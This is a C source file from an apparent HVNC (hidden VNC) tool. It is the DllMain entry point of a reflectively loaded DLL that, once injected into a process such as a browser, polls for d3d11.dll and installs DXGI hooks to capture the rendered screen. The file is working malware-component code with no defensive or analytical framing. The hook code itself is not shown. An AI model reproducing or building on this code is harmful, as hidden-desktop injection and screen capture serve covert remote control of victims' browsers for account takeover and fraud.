//===============================================================================================//
// HVNCCapture — ReflectiveDll.c
//
// Entry point for the reflective DLL. Called by ReflectiveLoader after the DLL
// is mapped into memory. Defers DXGI hook installation to a worker thread
// because DllMain runs under the loader lock and cannot safely call
// LoadLibrary / D3D11CreateDeviceAndSwapChain.
//===============================================================================================//
#include "ReflectiveLoader.h"
#include "DXGICapture.h"

extern HINSTANCE hAppInstance;

static HANDLE g_InitThread = NULL;

// Worker thread: waits for d3d11.dll to appear, then installs hooks.
static DWORD WINAPI DeferredInit(LPVOID param)
{
    (void)param;
    // Poll for d3d11.dll up to 60 seconds (browser may take a while)
    for (int i = 0; i < 600; i++) {
        if (GetModuleHandleA("d3d11.dll") != NULL)
            break;
        Sleep(100);
    }
    if (GetModuleHandleA("d3d11.dll") == NULL) {
        // Process never loaded D3D11 — nothing to hook
        return 0;
    }
    // Brief delay for swapchain creation
    Sleep(500);
    InstallDXGICapture();
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
    BOOL bReturnValue = TRUE;

    switch (dwReason)
    {
    case DLL_PROCESS_ATTACH:
        hAppInstance = hinstDLL;
        DisableThreadLibraryCalls(hinstDLL);
        g_InitThread = CreateThread(NULL, 0, DeferredInit, NULL, 0, NULL);
        break;
    case DLL_PROCESS_DETACH:
        if (g_InitThread) {
            WaitForSingleObject(g_InitThread, 5000);
            CloseHandle(g_InitThread);
            g_InitThread = NULL;
        }
        RemoveDXGICapture();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }

    return bReturnValue;
}
